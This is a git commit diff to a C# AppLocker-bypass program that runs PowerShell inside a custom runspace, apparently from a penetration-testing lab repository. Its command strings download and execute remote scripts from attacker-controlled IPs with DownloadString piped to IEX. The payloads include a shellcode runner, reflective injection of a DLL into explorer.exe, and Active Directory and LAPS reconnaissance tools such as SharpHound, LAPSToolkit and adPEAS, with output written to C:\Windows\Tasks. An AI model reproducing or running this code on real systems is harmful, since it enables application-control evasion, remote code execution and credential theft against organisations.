098a6c70c77bbf60ca5d9c8cb76b88d9a9e54a6e
thamyekh <yek3y.ht@gmail.com>
2023-12-11 14:11:26 +1300

    updated applocker_bypass_powershell_runspace

--- applocker_bypass_powershell_runspace/Program.cs
+++ applocker_bypass_powershell_runspace/Program.cs
@@ -20,8 +20,9 @@ namespace Bypass
             //String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.45.168/run.txt') | iex"; // run.txt is simple_shellcode_runner/simple_shellcode_runner.ps1
             //String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.102/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.49.102/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
             //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.168/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Windows\\Tasks\\test.txt";
-            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.220/SharpHound.ps1') | IEX; Invoke-BloodHound -CollectionMethod All";
-            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.220/LAPSToolkit.ps1') | IEX; Get-LAPSComputers | Out-File -FilePath C:\\Windows\\Tasks\\test.txt";
+            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.204/win/SharpHound.ps1') | IEX; Invoke-BloodHound -CollectionMethod All";
+            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.204/win/adPEAS.ps1') | IEX; Invoke-adPEAS -Outputfile 'C:\\Windows\\Tasks\\adpeas.txt'";
+            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.204/win/LAPSToolkit.ps1') | IEX; Get-LAPSComputers | Out-File -FilePath C:\\Windows\\Tasks\\test.txt";
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
             PowerShell ps = PowerShell.Create();
